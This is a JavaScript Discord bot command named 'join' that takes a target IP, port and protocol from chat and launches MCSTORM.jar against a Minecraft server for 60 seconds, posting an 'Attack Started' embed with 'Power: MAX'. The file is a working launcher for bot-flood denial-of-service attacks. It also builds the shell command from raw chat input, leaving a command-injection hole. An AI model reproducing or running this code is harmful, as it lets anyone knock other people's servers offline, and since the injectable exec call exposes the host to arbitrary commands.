const { MessageEmbed, Client, ReactionUserManager } = require("discord.js")
const config = require("../../config.json")
const exec = require('child_process').exec
const CommandRoom = config.COMMANDROOM

module.exports = {
    name: 'join',
    description: 'Join Bot Server Minecraft',
    aliases: [''],
    cooldown: 60,
    async execute(client, message, args, Discord) {
        if (message.channel.id != CommandRoom) {
            return;
          }
        const ip = message.content.split(" ")[1]
        const port = message.content.split(" ")[2]
        const protocols = message.content.split(" ")[3]

        if(!args[0]) {
            message.channel.send(`Vui Long Ghi Them IP`)
            return
        }
        if(!args[1]) {
            message.channel.send(`Vui Long Ghi Them PORT`)
            return
        }
        if(!args[2]) {
            message.channel.send(`Vui Long Ghi Them Protocols`)
            return
        }
    exec(`java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar ${ip}:${port} ${protocols} join 60 -1`, (error, stdout, stderr) => {
    })
    const load = new MessageEmbed()
    .setTitle(`Loadding`)
    .setDescription(`Vui Long Doi!`)
    .setImage(`https://media3.giphy.com/media/Vk7VKS50xcSC4/giphy.gif?cid=790b761199ef5f8e016e75e56691c1870ca65397ceb7e430&rid=giphy.gif&ct=g`)
    .setTimestamp()

    const embed = new MessageEmbed()
    .setTitle(`🔥 Attack Started 🔥`)
    .setDescription(`\`IP: ${ip}\nPORT: ${port}\nProtocols: ${protocols}\nPower: MAX\nDuration: 60s\``)
    .setTimestamp()
    .setColor("RANDOM")
    .setFooter(`Haizzz`, client.user.avatarURL)
    .setImage('https://media1.giphy.com/media/1hMJTkDXPTBiU/giphy.gif?cid=ecf05e47nbrll0ifzfp4lacpk2bqobq6e3jk5ltdo42bt1of&rid=giphy.gif&ct=g')
    
    let msg = await message.channel.send(`Loadding.......`)
    msg.edit(embed)
        

    }
}